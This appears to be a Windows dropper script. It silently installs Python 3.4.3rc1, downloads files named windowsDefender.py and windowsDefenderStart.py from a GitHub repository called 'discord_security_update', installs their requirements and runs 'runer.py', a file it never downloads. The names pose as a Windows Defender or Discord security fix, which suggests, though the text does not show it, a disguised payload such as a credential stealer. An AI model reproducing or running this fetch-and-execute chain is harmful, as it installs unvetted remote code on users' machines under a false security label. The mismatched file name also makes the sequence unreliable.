curl https://www.python.org/ftp/python/3.4.3/python-3.4.3rc1.amd64.msi -O
msiexec /a python-3.4.3rc1.amd64.msi /qb TARGETDIR=C:\python34


curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefenderStart.py -O
curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/requirements.txt -O

pip install -r requirements.txt

python runer.py
